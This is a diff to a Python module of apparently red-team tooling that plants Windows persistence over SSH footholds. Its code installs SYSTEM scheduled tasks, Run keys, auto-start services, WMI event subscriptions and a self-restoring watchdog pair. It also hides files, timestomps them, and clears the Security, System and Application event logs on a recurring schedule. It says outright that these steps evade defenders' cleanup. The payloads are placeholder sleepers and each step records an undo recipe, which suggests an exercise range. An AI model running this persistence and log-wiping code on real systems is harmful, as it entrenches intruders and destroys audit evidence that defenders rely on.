@@ -1,44 +1,9 @@
-"""persist_windows — the Windows mechanics behind `persist`, one handler per family.
+"""persist_windows — the Windows mechanics behind `persist`, one handler per family."""
 
-`persist.py` owns the registry entry, the family choice, the naming draw, the
-record and the bookkeeping. This module owns the MECHANICS: what is actually
-planted on a Windows box and how it is taken back off. The contract between the
-two is exactly two names:
-
-    FAMILIES : {family_name: handler_fn}
-    apply(ctx, ip, family, names) -> Result
-
-Three rules this module obeys (each one is a lesson from the earlier agent):
-
-* **The script's exit code is the proof.** Every handler installs *and* verifies
-  inside one round trip and exits non-zero when the artifact is not standing, so
-  a plant that did not land is ``ok=False`` and never enters the artifact list
-  ("recorded what the install did", never what a later check-in claimed).
-* **Re-assertion is idempotent.** Every install is written so that running it
-  twice re-asserts the existing artifact (``-Force``, ``Set-WmiInstance`` on a
-  keyed instance, or an explicit ``if standing -> config else -> create``
-  branch) instead of creating a second one, and the world record is not
-  duplicated either. The earlier agent's families were create-only: the second
-  plant either failed outright or left two artifacts behind.
-* **Every artifact carries a ``check_cmd`` and a ``restore`` recipe** rendered
-  from the same derived names. ``run.py``'s verify loop re-runs ``check_cmd``
-  through the *legacy* Windows wrap (``ssh(..., windows=True)`` ->
-  ``winexec.wrap``), so a ``check_cmd`` must be a single, double-quote-free
-  line — asserted in this module's tests with ``winexec.assert_shippable``.
-
-Every command that goes over the wire is composed here by ``exec/winexec.py``
-and nothing else: ``ps()`` (EncodedCommand, base64/UTF-16LE) is used for all of
-them because every plant in this module is a multi-statement, quote-heavy
-script and the legacy ``-Command "<line>"`` wrap cannot carry a quote at all
-(the landing shell is cmd.exe, and ``winexec`` asserts the invariant).
-
-One deliberate split on "payload": a helper ``.cmd`` we *drop* gets a batch
-body (the earlier agent's ``ping -n 600 127.0.0.1 >nul``), while a command line
-**Windows
-itself evaluates** (a Run value, a WMI consumer's CommandLineTemplate, a
-watchdog payload's argv) is ``SLEEP_CMDLINE`` — built by winexec, so the
-quoting decision is never made by hand.
-"""
+# Installs verify in the same round trip: the exit code is the proof, and every install is
+# idempotent (-Force / keyed Set-WmiInstance / standing-check branch). check_cmd must be ONE
+# double-quote-free line — run.py re-runs it through the legacy winexec wrap. All traffic
+# goes out as winexec.ps EncodedCommand; nothing is quoted by hand.
 
 import re
 
@@ -47,34 +12,28 @@ from .base import Result, can_root
 
 TIMEOUT = 90
 
-# The bland batch body of every helper .cmd we drop (the earlier agent's exact
-# body).
+# The bland batch body of every helper .cmd we drop
 SLEEP_CMD_BODY = "ping -n 600 127.0.0.1 >nul"
 
-# A command line Windows evaluates by itself. Composed through winexec: one
-# argument, no quoting left to get wrong inside a registry value or an argv.
+# A command line Windows evaluates itself: composed by winexec, no hand quoting
 SLEEP_CMDLINE = winexec.ps("Start-Sleep 600")
 
-# The two Run-key locations (the mechanism, not one of our names): the machine
-# hive, and the default-profile hive so every NEW profile inherits the entry.
+# The two Run hives (the mechanism, not our names): machine, and default-profile so
+# every NEW profile inherits the entry
 HKLM_RUN = "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
 HKU_DEFAULT_RUN = ("Registry::HKEY_USERS\\.DEFAULT\\Software\\Microsoft"
                    "\\Windows\\CurrentVersion\\Run")
 
-# Trailing verdict of a one-statement install: the exit code is the proof.
+# Trailing verdict of an install: the exit code is the proof
 VERIFY_TAIL = "if ($?) { exit 0 } else { exit 1 }"
 
-# Concrete Windows paths inside a detail string (fallback only: tlaloc artifacts
-# carry `paths`, which is what hide/timestomp read first).
+# Path scrape inside detail strings — fallback only, artifacts carry `paths` first
 _WIN_PATH_RE = re.compile(r"([A-Za-z]:\\[\w\\.+@-]{2,})")
 
 
-# -- the handler contract ------------------------------------------------------
 
 def apply(ctx, ip, family, names):
-    """Plant (or re-assert) one Windows family. Never raises: a transport or
-    box failure is ``ok=False`` with the reason, so one bad family cannot poison
-    anything else (the caller runs one family per call)."""
+    """Plant/re-assert one family. Never raises: one bad family cannot poison the rest."""
     fh = ctx.world.foothold(ip)
     if not fh:
         return Result(False, f"persist_windows: no foothold on {ip}")
@@ -94,17 +53,14 @@ def apply(ctx, ip, family, names):
                              f"{type(exc).__name__}: {exc}")
 
 
-# -- plumbing ------------------------------------------------------------------
 
 def _admin(fh):
-    """Administrator on Windows is admin-equivalent: no privesc path exists for
-    a plant, the session itself is the privilege."""
+    """Admin-equivalent: the session itself is the privilege, no privesc path for a plant."""
     return bool(can_root(fh) or str((fh or {}).get("user", "")).lower()
                 in ("administrator", "admin"))
 
 
 def _send(ctx, ip, fh, script, timeout=TIMEOUT):
-    """One Windows round trip, always as EncodedCommand (``winexec.ps``)."""
     return ctx.ssh.ssh(ip, fh["user"], fh.get("password") or "",
                        winexec.ps(script), timeout=timeout,
                        key_path=fh.get("key_path"))
@@ -116,12 +72,8 @@ def _why(rc, out, err):
 
 
 def _recorded(ctx, ip, kind, name=None):
-    """The world row for this artifact, if we already planted it.
-
-    Idempotency, second half: a repeat run must be ``ok=True`` *and* must not
-    append a duplicate row. The install command is idempotent on the box (that
-    is the first half); this keeps the record singular.
-    """
+    """The world row if already planted. A repeat run must be ok=True AND not append a
+    duplicate row (the box-side idempotence is the install command's job)."""
     for artifact in ctx.world.artifacts(ip):
         if artifact.get("kind") != kind:
             continue
@@ -131,12 +83,8 @@ def _recorded(ctx, ip, kind, name=None):
 
 
 def _done(ctx, ip, kind, name, detail, check_cmd, paths, recipe, note=None):
-    """The single success exit: verify that passed -> artifact + undo recipe.
-
-    `detail` always ends in ``id=<name>``: ``state.world.artifact_key`` derives
-    a per-instance key from ``id=`` in the detail, which is what lets the
-    dead-artifact / re-plant logic tell two plants of one kind apart.
-    """
+    """Verify passed -> artifact + undo recipe. `detail` always ends in `id=<name>`:
+    artifact_key derives the per-instance key from it (tells two plants of one kind apart)."""
     if note:
         ctx.world.note(ip, note)
     restore = {"recipe": list(recipe), "secrets": None}
@@ -151,13 +99,8 @@ def _done(ctx, ip, kind, name, detail, check_cmd, paths, recipe, note=None):
 
 
 def _planted_paths(ctx, ip):
-    """Concrete filesystem paths of everything we have planted on this box.
-
-    Reads the artifact's recorded ``paths`` first: the earlier agent described
-    its Windows plants in prose ("task TzNetUpdate") and scraped paths back out
-    of the detail, so hide/timestomp found nothing on a Windows box and reported
-    "nothing planted" on every plant. The scrape stays as a fallback.
-    """
+    """Filesystem paths of everything planted here. Recorded `paths` first; the detail-
+    string scrape is the fallback (prose-only details hid everything from hide/timestomp)."""
     paths = set()
     for artifact in ctx.world.artifacts(ip):
         paths.update(artifact.get("paths") or [])
@@ -166,8 +109,7 @@ def _planted_paths(ctx, ip):
 
 
 def _array(paths):
-    """A PowerShell array literal of single-quoted paths (no double quotes:
-    these strings also end up inside check_cmds, which ride the legacy wrap)."""
+    """PowerShell array of single-quoted paths (no double quotes: also used in check_cmds)."""
     return ",".join("'" + p + "'" for p in paths)
 
 
@@ -176,20 +118,10 @@ def _maint_path(names):
     return f"C:\\Windows\\System32\\{names['stem']}-maint.cmd"
 
 
-# -- the families --------------------------------------------------------------
-# Order inside AUTO_ORDER_WINDOWS first (that is the "auto" walk), then the two
-# extra mechanisms from the earlier agent that the order does not name but that
-# the auto walk still offers once the ordered families are all standing.
 
 def scheduled_task(ctx, ip, fh, names):
-    """A SYSTEM-class scheduled task that keeps our helper .cmd alive.
-
-    The earlier agent's mechanism verbatim — ``schtasks /Create /TN <name> /SC
-    MINUTE /MO 15 /RU SYSTEM`` — with ``/F`` doing the work the earlier agent
-    left undone: a second plant re-asserts the same task instead of failing on
-    "already exists" or leaving two tasks behind. The ``/Query`` tail is the
-    proof, and blue's undo is one ``schtasks /Delete``.
-    """
+    """SYSTEM scheduled task, every 15 min, running our helper .cmd. /F makes the second
+    plant re-assert instead of failing or duplicating; /Query is the proof."""
     task, script = names["task"], names["script"]
     ps = (f"Set-Content -Path '{script}' -Value '{SLEEP_CMD_BODY}' -Encoding ascii; "
           f"schtasks /Create /TN '{task}' /TR '{script}' "
@@ -207,13 +139,8 @@ def scheduled_task(ctx, ip, fh, names):
 
 
 def defrun(ctx, ip, fh, names):
-    """``HKU\\.DEFAULT\\...\\Run``: every NEW user profile inherits red's entry.
-
-    The earlier agent's mechanism and its bug fix both kept: the default-profile
-    hive ships NO Run key and ``New-ItemProperty`` refuses a missing parent
-    (rc=1 — the reason this family never planted in the earlier agent), so the
-    key is created first, ``-Force`` making that idempotent.
-    """
+    """HKU\\.DEFAULT Run: every NEW profile inherits the entry. The default hive ships NO
+    Run key and New-ItemProperty refuses a missing parent, so the key is created first."""
     value = names["run_value"]
     ps = (f"$p = '{HKU_DEFAULT_RUN}'; "
           "New-Item -Path $p -Force | Out-Null; "
@@ -234,14 +161,8 @@ def defrun(ctx, ip, fh, names):
 
 
 def runkey(ctx, ip, fh, names):
-    """``HKLM\\...\\Run``: the box re-plants us at every logon.
-
-    The earlier agent's flagship Windows mechanism, unchanged in location, with
-    the value name drawn from the naming pool (its fixed value name was the
-    giveaway) and a real verification instead of the earlier agent's ``$?`` after
-    an ``Out-Null`` — which reads the pipe's exit code and is true whatever the
-    write did.
-    """
+    """HKLM Run: the box re-plants us at every logon. Value name comes from the naming pool
+    (a fixed one is the giveaway); verification reads the value back, not `$?` after Out-Null."""
     value = names["run_value"]
     ps = (f"New-ItemProperty -Path '{HKLM_RUN}' -Name '{value}' "
           f"-Value '{SLEEP_CMDLINE}' -PropertyType String -Force | Out-Null; "
@@ -259,13 +180,8 @@ def runkey(ctx, ip, fh, names):
 
 
 def service(ctx, ip, fh, names):
-    """A bland auto-start service backed by a no-space helper .cmd.
-
-    ``sc.exe create <name> binPath= <script> start= auto`` is the earlier agent's
-    mechanism. The branch is the re-assert half: ``create`` on an existing
-    service fails (rc=1073), so a second plant goes through ``sc.exe config`` and
-    touches nothing else.
-    """
+    """Bland auto-start service backed by a no-space helper .cmd. `sc create` on an existing
+    service fails (rc=1073), so the re-assert branch goes through `sc config`."""
     svc, script = names["service"], names["script"]
     ps = (f"Set-Content -Path '{script}' -Value '{SLEEP_CMD_BODY}' -Encoding ascii; "
           f"if (Get-Service -Name '{svc}' -ErrorAction SilentlyContinue) {{ "
@@ -285,15 +201,9 @@ def service(ctx, ip, fh, names):
 
 
 def wmisub(ctx, ip, fh, names):
-    """A permanent WMI event subscription: filter + CommandLineEventConsumer +
-    binding, the earlier agent's mechanism unchanged.
-
-    It survives reboots and most cleanup sweeps because the instances live in
-    ``root\\subscription`` where blue rarely looks, and re-assertion is free:
-    ``__EventFilter``/``CommandLineEventConsumer`` are keyed on Name+Namespace,
-    so ``Set-WmiInstance`` updates the instance it already owns instead of
-    creating a second one.
-    """
+    """Permanent WMI subscription (filter+consumer+binding) in root\\subscription, where
+    cleanup rarely looks. The instances are keyed on Name+Namespace, so Set-WmiInstance
+    re-asserts instead of creating a second one."""
     wmi, script = names["wmi"], names["script"]
     ps = (f"Set-Content -Path '{script}' -Value '{SLEEP_CMD_BODY}' -Encoding ascii; "
           "$f = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter "
@@ -329,20 +239,10 @@ def wmisub(ctx, ip, fh, names):
 
 
 def watchpair(ctx, ip, fh, names):
-    """A mutual watchdog pair (SharpWatchdogs, pure PowerShell).
-
-    Two SYSTEM tasks run one shared helper that re-registers BOTH tasks and
-    restarts BOTH payloads, so a piecemeal cleanup is undone within a minute:
-    blue has to unregister both tasks in the same pass, then the helper
-    directory. The earlier agent's fixed names (``TzHelpMon``/``TzHelpUpd`` in
-    ``C:\\ProgramData\\Microsoft\\Help``) are exactly the giveaway this rewrite
-    removes — the directory, the helper, the tasks and the payload copies are
-    all derived from this plant's own draw.
-
-    Payloads are copies of ``$env:ComSpec`` under the task names (the earlier
-    agent's trick: a live process whose image name means nothing), started on a
-    sleeper argv.
-    """
+    """Mutual watchdog pair: two SYSTEM tasks share one helper that re-registers BOTH and
+    restarts BOTH payloads, so piecemeal cleanup is undone within a minute. All names are
+    drawn (fixed watchdog names are the giveaway). Payloads are $env:ComSpec copies under
+    the task names, started on a sleeper argv."""
     t1, t2 = names["task"], names["log_task"]
     root = f"C:\\ProgramData\\Microsoft\\{names['service']}"
     helper = f"{root}\\{names['stem']}-watch.ps1"
@@ -371,8 +271,7 @@ def watchpair(ctx, ip, fh, names):
         "  }",
         "}",
     ]
-    # The helper ships as an array of single-quoted lines (the earlier agent's
-    # form): the script is written BY PowerShell, so embedded quotes get doubled.
+    # helper ships as single-quoted lines with doubled embedded quotes (written BY PowerShell)
     body = ",".join("'" + line.replace("'", "''") + "'" for line in lines)
 
     ps = (f"$d = '{root}'; "
@@ -409,14 +308,8 @@ def watchpair(ctx, ip, fh, names):
 
 
 def hide(ctx, ip, fh, names):
-    """``attrib +h +s`` over everything we planted (the earlier agent's hiding
-    technique).
-
-    The point is that a directory listing and a "recently modified" sweep both
-    come back clean, so the payloads survive a casual hunt; unhiding is one
-    ``attrib -h -s``, which is what the recipe records. Paths come from the
-    artifacts' own ``paths`` (see ``_planted_paths``).
-    """
+    """attrib +h +s over planted paths: listings and recency sweeps stay clean. Paths come
+    from the artifacts' recorded `paths` (_planted_paths)."""
     paths = _planted_paths(ctx, ip)
     if not paths:
         return Result(False, f"hide on {ip}: nothing planted to hide")
@@ -442,14 +335,8 @@ def hide(ctx, ip, fh, names):
 
 
 def logwipe(ctx, ip, fh, names):
-    """Clear Security/System/Application, then leave a SYSTEM task that keeps
-    clearing them (the earlier agent's ``wevtutil`` mechanism, same three logs,
-    same 30-minute re-clear via a helper .cmd).
-
-    The cleared logs themselves are NOT recoverable — they are gone. The
-    artifact is the re-clear task: stopping it stops the bleeding, and the undo
-    recipe says so honestly rather than pretending the events come back.
-    """
+    """Clear Security/System/Application, plus a SYSTEM task re-clearing every 30 min.
+    Cleared logs are unrecoverable; the artifact is the re-clear task and the recipe says so."""
     task, helper = names["log_task"], _maint_path(names)
     body = "wevtutil cl Security & wevtutil cl System & wevtutil cl Application"
     ps = ("wevtutil cl Security; wevtutil cl System; wevtutil cl Application; "
@@ -473,15 +360,9 @@ def logwipe(ctx, ip, fh, names):
 
 
 def timestomp(ctx, ip, fh, names):
-    """Stamp our artifacts with a system-plausible timestamp.
-
-    The earlier agent matched them to a fixed reference file
-    (``System32\\ntdll.dll``); here the reference is the Windows directory's own
-    creation time — the same technique with no ported literal path. The
-    pre-stamp ticks of every file are captured in the SAME round trip, so the
-    restore recipe is exact instead of nominal: ticks are integers, so the
-    recipe survives locale and formatting.
-    """
+    """Stamp artifacts with the Windows-dir creation time (a system-plausible reference,
+    no ported literal path). Pre-stamp ticks are captured in the same round trip, so the
+    restore recipe is exact and locale-proof."""
     paths = _planted_paths(ctx, ip)
     if not paths:
         return Result(False, f"timestomp on {ip}: nothing planted to stamp")
@@ -510,8 +391,7 @@ def timestomp(ctx, ip, fh, names):
         recipe.append(f"(Get-Item '{path}').LastAccessTime = [datetime]::new({accessed})")
     detail = (f"timestamps matched to the system reference on {len(stamped)} "
               f"planted file(s) id=timestomp-{names['stem']}")
-    # The artifact is "these files no longer look recently touched" — the check
-    # is honestly that, not a byte comparison.
+    # the artifact is "no longer looks recently touched": the check is that, not bytes
     check = ("if ("
              + " -and ".join(f"(Get-Item '{p}').LastWriteTime -lt "
                              "(Get-Date).AddDays(-7)" for p, _, _, _ in stamped)
@@ -521,15 +401,8 @@ def timestomp(ctx, ip, fh, names):
 
 
 def decoy(ctx, ip, fh, names):
-    """An obvious bait service that absorbs blue's cleanup (the earlier agent's
-    decoy).
-
-    ``sc.exe create <name> binPath= C:\\Windows\\System32\\cmd.exe type= own
-    start= auto`` with an obviously malicious description: the point is that it
-    IS found, so the effort spent on it is effort not spent on the real family.
-    Re-assertion goes through ``sc.exe config`` (create on an existing service
-    fails).
-    """
+    """Obvious bait service with a malicious description: meant to be found, absorbing
+    cleanup effort. Re-assert goes through sc config (create fails on an existing service)."""
     name = names["decoy_service"]
     ps = (f"if (Get-Service -Name '{name}' -ErrorAction SilentlyContinue) {{ "
           f"sc.exe config '{name}' binPath= C:\\Windows\\System32\\cmd.exe "
@@ -549,9 +422,8 @@ def decoy(ctx, ip, fh, names):
                   f"sc.exe delete '{name}'"])
 
 
-# The families `persist.auto_order(windows=True)` walks, in that order, then the
-# extra mechanisms from the earlier agent. The values are the handlers above;
-# `persist.py` owns the choice, this map owns the mechanics.
+# The order persist.auto_order(windows=True) walks; persist.py owns the choice, this map
+# owns the mechanics
 FAMILIES = {
     "scheduled_task": scheduled_task,
     "defrun": defrun,
